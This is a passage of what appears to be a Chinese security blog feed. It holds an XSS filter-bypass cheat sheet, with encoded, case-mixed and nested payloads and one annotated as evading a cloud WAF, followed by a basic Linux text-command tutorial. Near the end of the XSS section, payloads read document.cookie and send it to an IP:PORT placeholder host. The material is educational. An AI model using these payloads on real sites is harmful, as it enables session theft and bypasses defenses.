action&#x3D;javascript:alert(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;aa.asp? onmouseover&#x3D;prompt(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;aa.asp? onmouseover&#x3D;alert(&#39;xss&#39;)&gt;</span><br><span class="line">&lt;form action&#x3D;1 onmouseover&#x3D;alert(&#39;xss)&gt;</span><br><span class="line">&lt;!--原code--&gt;</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;&quot;data:text&#x2F;html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;</span><br><span class="line">&lt;!--base64编码--&gt;</span><br><span class="line">&lt;form method&#x3D;post action&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;iframe&gt;</code>标签</p><p>XSS利用方式1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;javascript:alert(&#39;xss&#39;);height&#x3D;5width&#x3D;1000 &#x2F;&gt;&lt;iframe&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">&lt;!--原code--&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;</span><br><span class="line">&lt;!--base64编码--&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;aaa&quot; onmouseover&#x3D;alert(&#39;xss&#39;) &#x2F;&gt;&lt;iframe&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;javascript&amp;colon;prompt&amp;lpar;&#96;xss&#96;&amp;rpar;&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure><p><code>svg&lt;&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><h4 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h4><p>绕过思路有很多,但是分类却有点难,实在是不知道怎么去定义每一类的绕过思路。</p><h5 id="1、过滤关键字"><a href="#1、过滤关键字" class="headerlink" title="1、过滤关键字"></a>1、过滤关键字</h5><ul><li><p>大小写绕过、大小写混合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ScRipt&gt;ALeRt(&quot;XSS&quot;);&lt;&#x2F;sCRipT&gt;</span><br></pre></td></tr></table></figure></li><li><p>嵌套,也就是重复</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>代替</p><p>iframe就可以代替script<br>confirm和prompt可以代替alert</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;marquee/onstart=confirm(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;details/open/ontoggle=top[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>](<span class="number">1</span>)&gt; 谷歌浏览器 【绕阿里云XSS】</span><br><span class="line">&lt;svg/onload=prompt(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;style onload=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;iframe src=javascript:alert`<span class="number">1</span>`&gt;</span><br><span class="line">&lt;body onload=prompt(<span class="number">1</span>);&gt;</span><br><span class="line">&lt;<span class="keyword">select</span> autofocus onfocus=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;script&gt;confirm(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>HTML5 新增的实体命名编码</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;colon; =&gt; [冒号]</span><br><span class="line"></span><br><span class="line">&amp;NewLine; =&gt; [换行]</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span>: &lt;a href=<span class="string">&quot;javasc&amp;NewLine;ript&amp;colon;alert(1)&quot;</span>&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure></li><li><p>编码</p><p>HTML实体可以使用十进制与十六进制编码;</p><p>javascript可以使用Unicode与八进制与十六进制进行编码.</p><p><code>eval()</code>函数可计算某个字符串,并执行其中的的 JavaScript 代码,可以吧js代码转化为jsunicode,jsunicode可以使用网站<code>http://web.chacuo.net/charsetjsascii</code></p><p>将payload进行进制转化,十六进制前面+<code>&amp;#x</code>,十进制+<code>&amp;#</code></p><p><strong>对于JS编码</strong></p><ul><li><p>unicode配合js的eval函数</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  &lt;img src=<span class="string">&quot;1&quot;</span> onerror=eval(<span class="string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#117;&amp;#110;&amp;#105;&amp;#99;&amp;#111;&amp;#100;&amp;#101;&amp;#39;&amp;#41;&quot;</span>)&gt;&lt;/img&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;1&quot;</span> onerror=eval(<span class="string">&quot;\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0075\u006e\u0069\u0063\u006f\u0064\u0065\u0027\u0029&quot;</span>)&gt;&lt;/img&gt;</span><br></pre></td></tr></table></figure></li><li><p>八进制与十六进制编码</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(<span class="string">&quot;\141\154\145\162\164\50\57\170\163\163\57\51&quot;</span>);&lt;/script&gt;（JS八进制编码）</span><br></pre></td></tr></table></figure><script>eval("\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29");</script>（JS十六进制编码）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- String.fromCharCode</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;csharp</span><br><span class="line">&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;eval(String.fromCharCode(97,108,101,114,116,40,39,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,10 1,39,41))&gt;&lt;&#x2F;img&gt;</span><br></pre></td></tr></table></figure></li><li><p>data协议</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgnZGF0YSBwcm90b2NvbCcpPC9zY3JpcHQ+&quot;&gt;&lt;&#x2F;object&gt;</span><br></pre></td></tr></table></figure></li></ul><p><strong>对html编码</strong></p><ul><li><p>十进制与十六进制</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;</span>&gt;  （HTML实体十进制编码)</span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="string">&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;&quot;</span>&gt; (HTML实体十六进制编码)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**js特性**</span><br><span class="line"></span><br><span class="line">| Payload                                          | 效果                   |</span><br><span class="line">| ------------------------------------------------ | ---------------------- |</span><br><span class="line">| &#96;&#39;alert(&quot;xss&quot;)&#39;.replace(&#x2F;.*&#x2F;g,eval)&#96;             | &#96;eval(&#39;alert(&quot;xss&quot;)&#39;)&#96; |</span><br><span class="line">| &#96;&#39;str1ng&#39;.replace(&#x2F;1&#x2F;,alert)&#96;                    | &#96;alert(1)&#96;             |</span><br><span class="line">| &#96;&#39;bbbalert(1)cccc&#39;.replace(&#x2F;a\w&#123;4&#125;\(\d\)&#x2F;,eval)&#96; | &#96;eval(&#39;alert(1)&#39;)&#96;     |</span><br><span class="line"></span><br><span class="line">​&#96;&#96;&#96;csharp</span><br><span class="line">&lt;script&gt;&#39;str1ng&#39;.replace(&#x2F;1&#x2F;,alert)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h5 id="2、过滤符号"><a href="#2、过滤符号" class="headerlink" title="2、过滤符号"></a>2、过滤符号</h5><ul><li><p>过滤空格</p><h6 id="用-或者"><a href="#用-或者" class="headerlink" title="用/**/或者/"></a>用<code>/**/</code>或者<code>/</code></h6><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=<span class="string">&quot;1&quot;</span>/onerror=<span class="string">&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;&quot;</span>&gt;</span><br><span class="line">&lt;img<span class="comment">/**/</span>src=<span class="string">&quot;1&quot;</span><span class="comment">/**/</span>onerror=<span class="string">&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;&quot;</span>&gt;</span><br></pre></td></tr></table></figure></li></ul><h5 id="3、常用函数"><a href="#3、常用函数" class="headerlink" title="3、常用函数"></a>3、常用函数</h5><ul><li><p>atob()与btoa()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">atob(<span class="string">&quot;L2h0dHA6Lw==&quot;</span>)</span><br><span class="line"><span class="string">&quot;/http:/&quot;</span></span><br><span class="line">btoa(/http:/)</span><br><span class="line"><span class="string">&quot;L2h0dHA6Lw==&quot;</span></span><br></pre></td></tr></table></figure><p>在 JavaScript 中，有两个函数被分别用来处理解码和编码 base64 字符串：</p><ul><li>atob() //ASCII to Base64</li><li>btoa() //Base64 to ASCII</li></ul></li><li><p>slice()</p><p>slice() 方法可从已有的数组中返回选定的元素</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arrayObject.slice(start,end)</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atob(btoa(&#x2F;http:&#x2F;)).slice(1).concat(&#x2F;IP:PORT&#x2F;).concat(eval(atob(btoa(&#x2F;docum&#x2F;)).slice(1,-1).concat(atob(btoa(&#x2F;ent.cookie&#x2F;)).slice(1,-1))))</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200621144413840.png" alt="image-20200621144413840"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload&#x3D;location.href&#x3D;eval(atob(btoa(&#x2F;docu&#x2F;)).slice(1,-1).concat(atob(btoa(&#x2F;ment.cookie&#x2F;)).slice(1,-1)))&gt;</span><br></pre></td></tr></table></figure><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200621153113215.png" alt="image-20200621153113215"></p>]]></content>
      
      
      <categories>
          
          <category> 前端安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OWSP-TOP10 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux命令</title>
      <link href="2018/12/12/Linux%E5%91%BD%E4%BB%A4/"/>
      <url>2018/12/12/Linux%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux命令"><a href="#Linux命令" class="headerlink" title="Linux命令"></a>Linux命令</h1><h2 id="tr"><a href="#tr" class="headerlink" title="tr"></a>tr</h2><h3 id="命令介绍"><a href="#命令介绍" class="headerlink" title="命令介绍"></a>命令介绍</h3><p>tr命令主要用于删除文件中控制字符或进行字符转换。</p><p>tr命令格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tr [ -d ] [ -c ] [ -s ] [ 字符串1 ] [ 字符串2 ] 文件名。其中字符串1用于查询，字符串2用于处理各种转换。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-c 用字符串1中字符集的补集替换此字符集，要求字符集为ASCII。</span><br><span class="line">-d 删除字符串1中所有输入字符。</span><br><span class="line">-s 删除所有重复出现字符序列，只保留第一个；即将重复出现字符串压缩为一个字符串。</span><br></pre></td></tr></table></figure><p>常用字符类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[:alnum:]：字母和数字</span><br><span class="line">[:alpha:]：字母</span><br><span class="line">[:cntrl:]：控制（非打印）字符</span><br><span class="line">[:digit:]：数字</span><br><span class="line">[:graph:]：图形字符</span><br><span class="line">[:lower:]：小写字母</span><br><span class="line">[:print:]：可打印字符</span><br><span class="line">[:punct:]：标点符号</span><br><span class="line">[:space:]：空白字符</span><br><span class="line">[:upper:]：大写字母</span><br><span class="line">[:xdigit:]：十六进制字符</span><br></pre></td></tr></table></figure><h3 id="实例操作"><a href="#实例操作" class="headerlink" title="实例操作"></a>实例操作</h3><p>删除换行和替换换行为空</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ cat &#x2F;home&#x2F;steady&#x2F;tcp.txt</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">steady@steady:~$ cat &#x2F;home&#x2F;steady&#x2F;tcp.txt | tr -d &quot;\n&quot;</span><br><span class="line">12345678910</span><br><span class="line">steady@steady:~$ cat &#x2F;home&#x2F;steady&#x2F;tcp.txt | tr  &quot;\n&quot; &quot; &quot;</span><br><span class="line">1 2 3 4 5 6 7 8 9 10 </span><br></pre></td></tr></table></figure><p>只删除数字或者字母</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ cat steady.txt</span><br><span class="line">2346tre2345r3rgegf43tr4rf3gef s&#x2F;.,affffuioeufoifskf&#x2F;,&#x2F;,&#39;l245</span><br><span class="line">steady@steady:~$ cat steady.txt | tr -d &quot;[0-9]&quot;</span><br><span class="line">trerrgegftrrfgef s&#x2F;.,affffuioeufoifskf&#x2F;,&#x2F;,&#39;l</span><br><span class="line">steady@steady:~$ cat steady.txt | tr -d &quot;[a-zA-Z]&quot;</span><br><span class="line">2346234534343 &#x2F;.,&#x2F;,&#x2F;,&#39;245</span><br></pre></td></tr></table></figure><p>删除非字母的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ cat steady.txt | tr -d -c &quot;[a-zA-Z]&quot;</span><br><span class="line">trerrgegftrrfgefsaffffuioeufoifskfl</span><br></pre></td></tr></table></figure><p>去除重复字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ cat steady.txt</span><br><span class="line">12222 easdsssss asd2w111</span><br><span class="line">steady@steady:~$ cat steady.txt | tr -s &quot;2&quot;</span><br><span class="line">12 easdsssss asd2w111</span><br><span class="line">steady@steady:~$ cat steady.txt | tr -s &quot;2s&quot;</span><br><span class="line">12 easds asd2w111</span><br><span class="line">steady@steady:~$ cat steady.txt | tr -s &quot;2s1&quot;</span><br><span class="line">12 easds asd2w1</span><br></pre></td></tr></table></figure><h2 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h2><h3 id="命令介绍-1"><a href="#命令介绍-1" class="headerlink" title="命令介绍"></a>命令介绍</h3><p>grep（global search regular expression(RE)and print out the line 即：全面搜索正则表达式并把行打印出来）命令是一个强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@www ~]# grep [-acinv] [--color&#x3D;auto] &#39;搜寻字符串&#39; filename</span><br><span class="line">选项与参数：</span><br><span class="line">-a ：将 binary 文件以 text 文件的方式搜寻数据</span><br><span class="line">-c ：计算找到 &#39;搜寻字符串&#39; 的次数</span><br><span class="line">-i ：忽略大小写的不同，所以大小写视为相同</span><br><span class="line">-n ：顺便输出行号</span><br><span class="line">-v ：反向选择，亦即显示出没有 &#39;搜寻字符串&#39; 内容的那一行！</span><br><span class="line">--color&#x3D;auto ：可以将找到的关键词部分加上颜色的显示喔！</span><br></pre></td></tr></table></figure><h3 id="实例操作-1"><a href="#实例操作-1" class="headerlink" title="实例操作"></a>实例操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ cat steady.txt | grep <span class="string">&quot;steady&quot;</span></span><br><span class="line">gjhgsteady</span><br><span class="line">steady897jhgj</span><br><span class="line">steady7678678</span><br><span class="line">steady87686</span><br><span class="line">steady@steady:~$ cat steady.txt | grep -v <span class="string">&quot;steady&quot;</span></span><br><span class="line">gongxinaojgl</span><br><span class="line"><span class="number">123456</span>gjhg</span><br><span class="line">steady@steady:~$ cat steady.txt | grep -v -n  <span class="string">&quot;steady&quot;</span></span><br><span class="line"><span class="number">3</span>:gongxinaojgl</span><br><span class="line"><span class="number">5</span>:<span class="number">123456</span>gjhg</span><br><span class="line"><span class="number">7</span>:</span><br></pre></td></tr></table></figure><h2 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h2><h3 id="sed-字符串替换"><a href="#sed-字符串替换" class="headerlink" title="sed 字符串替换"></a>sed 字符串替换</h3><p>sed替换的基本语法为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed &#39;s&#x2F;原字符串&#x2F;替换字符串&#x2F;&#39;</span><br></pre></td></tr></table></figure><p>命令中的三根斜线分隔符可以换成别的符号,有时候替换目录字符串的时候有较多斜线，这个时候换成其它的分割符是较为方便,只需要紧跟s定义即可。</p><p>一些特殊字符的使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">　　&quot;^&quot;表示行首</span><br><span class="line"></span><br><span class="line">　　&quot;$&quot;符号如果在引号中表示行尾，但是在引号外却表示末行(最后一行)</span><br></pre></td></tr></table></figure><p>例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 注意这里的 &quot;&amp;&quot; 符号，如果没有 &quot;&amp;&quot;&quot;，就会直接将匹配到的字符串替换掉</span><br><span class="line">sed &#39;s&#x2F;^&#x2F;添加的头部&amp;&#x2F;g&#39; 　　　　 #在所有行首添加</span><br><span class="line">sed &#39;s&#x2F;$&#x2F;&amp;添加的尾部&#x2F;g&#39; 　　　　 #在所有行末添加</span><br><span class="line">sed &#39;2s&#x2F;原字符串&#x2F;替换字符串&#x2F;g&#39;　 #替换第2行</span><br><span class="line">sed &#39;$s&#x2F;原字符串&#x2F;替换字符串&#x2F;g&#39;   #替换最后一行</span><br><span class="line">sed &#39;2,5s&#x2F;原字符串&#x2F;替换字符串&#x2F;g&#39; #替换2到5行</span><br><span class="line">sed &#39;2,$s&#x2F;原字符串&#x2F;替换字符串&#x2F;g&#39; #替换2到最后一行</span><br></pre></td></tr></table></figure><h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><h3 id="命令介绍-2"><a href="#命令介绍-2" class="headerlink" title="命令介绍"></a>命令介绍</h3><p>awk 命令的基本格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk [options] &#39;script&#39; file</span><br></pre></td></tr></table></figure><p><code>options</code> 这个表示一些可选的参数选项，<code>script</code> 表示 awk 的可执行脚本代码（一般被<code>&#123;&#125;</code> 花括号包围），这个是必须的。<code>file</code> 这个表示 awk 需要处理的文件，注意需要是纯文本文件（意味着 awk 能够处理）。</p><p>变量</p><p>变量<code>NF</code>表示当前行有多少个字段，因此<code>$NF</code>就代表最后一个字段。</p><p><code>$(NF-1)</code>代表倒数第二个字段。</p><p>函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tolower()：字符转为小写。</span><br><span class="line">length()：返回字符串长度。</span><br><span class="line">substr()：返回子字符串。</span><br><span class="line">sin()：正弦。</span><br><span class="line">cos()：余弦。</span><br><span class="line">sqrt()：平方根。</span><br><span class="line">rand()：随机数。</span><br></pre></td></tr></table></figure><h3 id="实例操作-2"><a href="#实例操作-2" class="headerlink" title="实例操作"></a>实例操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ cat steady.txt</span><br><span class="line">avahi:x:<span class="number">124</span>:<span class="number">130</span>:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin</span><br><span class="line">nm-openvpn:x:<span class="number">125</span>:<span class="number">131</span>:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin</span><br><span class="line">nm-openconnect:x:<span class="number">126</span>:<span class="number">132</span>:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/usr/sbin/nologin</span><br><span class="line">pulse:x:<span class="number">127</span>:<span class="number">134</span>:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin</span><br><span class="line">saned:x:<span class="number">128</span>:<span class="number">136</span>::/var/lib/saned:/usr/sbin/nologin</span><br><span class="line">inetsim:x:<span class="number">129</span>:<span class="number">138</span>::/var/lib/inetsim:/usr/sbin/nologin</span><br><span class="line">colord:x:<span class="number">130</span>:<span class="number">139</span>:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin</span><br><span class="line">geoclue:x:<span class="number">131</span>:<span class="number">140</span>::/var/lib/geoclue:/usr/sbin/nologin</span><br><span class="line">lightdm:x:<span class="number">132</span>:<span class="number">141</span>:Light Display Manager:/var/lib/lightdm:/bin/false</span><br><span class="line">king-phisher:x:<span class="number">133</span>:<span class="number">142</span>::/var/lib/king-phisher:/usr/sbin/nologin</span><br><span class="line">steady:x:<span class="number">1000</span>:<span class="number">1000</span>:steady,,,:/home/steady:/bin/bash</span><br><span class="line">systemd-coredump:x:<span class="number">999</span>:<span class="number">999</span>:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line"></span><br><span class="line">steady@steady:~$ cat steady.txt | awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print $1 $2&#125;&#x27;</span></span><br><span class="line">avahix</span><br><span class="line">nm-openvpnx</span><br><span class="line">nm-openconnectx</span><br><span class="line">pulsex</span><br><span class="line">sanedx</span><br><span class="line">inetsimx</span><br><span class="line">colordx</span><br><span class="line">geocluex</span><br><span class="line">lightdmx</span><br><span class="line">king-phisherx</span><br><span class="line">steadyx</span><br><span class="line">systemd-coredumpx</span><br></pre></td></tr></table></figure><h2 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h2><p>利用wc指令我们可以计算文件的Byte数、字数、或是列数，若不指定文件名称、或是所给予的文件名为”-“，则wc指令会从标准输入设备读取数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-l或--lines 只显示行数。</span><br></pre></td></tr></table></figure><h2 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h2><p>sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady/output/png$ cat flag.txt </span><br><span class="line">gong xinao </span><br><span class="line">ao</span><br><span class="line">bs</span><br><span class="line">wdh</span><br><span class="line">h</span><br><span class="line">daw</span><br><span class="line">r</span><br><span class="line">tq</span><br><span class="line">z</span><br><span class="line">zs</span><br><span class="line"></span><br><span class="line">steady@steady:~/桌面/steady/output/png$ sort flag.txt </span><br><span class="line"></span><br><span class="line">ao</span><br><span class="line">bs</span><br><span class="line">daw</span><br><span class="line">gong xinao </span><br><span class="line">h</span><br><span class="line">r</span><br><span class="line">tq</span><br><span class="line">wdh</span><br><span 